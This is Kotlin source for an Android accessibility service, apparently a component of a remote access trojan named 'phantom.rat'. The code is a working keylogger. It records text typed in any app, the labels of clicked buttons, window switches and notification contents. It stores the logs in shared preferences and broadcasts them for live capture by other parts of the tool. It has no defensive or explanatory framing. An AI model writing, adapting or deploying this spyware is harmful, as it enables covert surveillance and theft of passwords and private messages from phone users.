package com.phantom.rat.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

class PhantomAccessibilityService : AccessibilityService() {

    private var isRunning = false
    private var lastText = ""
    private val keylogs = mutableListOf<String>()

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_AVAILABLE_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_FOREGROUND_SERVICE
            notificationTimeout = 50
        }
        serviceInfo = info
        isRunning = true
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!isRunning || event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString(" ") ?: return
                if (text.isNotEmpty() && text != lastText) {
                    lastText = text
                    val source = event.source
                    val packageName = event.packageName?.toString() ?: ""
                    val className = event.className?.toString() ?: ""
                    
                    val logEntry = "$packageName|$className|$text"
                    keylogs.add(logEntry)
                    
                    // Store in prefs
                    val prefs = getSharedPreferences("keylogger_logs", Context.MODE_PRIVATE)
                    val existing = prefs.getString("logs", "") ?: ""
                    prefs.edit().putString("logs", "$existing\n$logEntry").apply()
                    
                    // Broadcast for real-time capture
                    val intent = Intent("com.phantom.rat.KEYLOG")
                    intent.putExtra("text", text)
                    intent.putExtra("package", packageName)
                    intent.putExtra("time", System.currentTimeMillis())
                    sendBroadcast(intent)
                }
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: ""
                val className = event.className?.toString() ?: ""
                
                val intent = Intent("com.phantom.rat.WINDOW_CHANGE")
                intent.putExtra("package", packageName)
                intent.putExtra("class", className)
                intent.putExtra("time", System.currentTimeMillis())
                sendBroadcast(intent)
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val node = event.source ?: return
                val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
                if (text.isNotEmpty()) {
                    val intent = Intent("com.phantom.rat.CLICK")
                    intent.putExtra("text", text)
                    intent.putExtra("time", System.currentTimeMillis())
                    sendBroadcast(intent)
                }
            }

            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: ""
                val text = event.text?.joinToString(" ") ?: ""
                if (text.isNotEmpty()) {
                    val intent = Intent("com.phantom.rat.NOTIFICATION")
                    intent.putExtra("package", packageName)
                    intent.putExtra("text", text)
                    intent.putExtra("time", System.currentTimeMillis())
                    sendBroadcast(intent)
                }
            }
        }
    }

    fun getLogs(): String {
        val prefs = getSharedPreferences("keylogger_logs", Context.MODE_PRIVATE)
        return prefs.getString("logs", "") ?: ""
    }

    fun clearLogs() {
        keylogs.clear()
        getSharedPreferences("keylogger_logs", Context.MODE_PRIVATE).edit().clear().apply()
    }

    override fun onInterrupt() {
        isRunning = false
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
